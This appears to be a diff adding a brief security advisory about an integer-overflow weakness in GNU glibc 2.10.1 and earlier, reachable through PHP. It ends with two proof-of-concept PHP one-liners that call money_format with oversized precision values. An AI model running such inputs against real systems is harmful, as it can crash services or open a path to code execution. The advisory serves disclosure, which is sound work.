@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/36443/info
+
+GNU glibc is prone to an integer-overflow weakness.
+
+An attacker can exploit this issue through other applications such as PHP to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.
+
+GNU glibc 2.10.1 and prior are vulnerable. 
+
+The following proof-of-concept commands are available:
+
+php -r 'money_format("%.1073741821i",1);'
+php -r 'money_format("%.1343741821i",1);' 
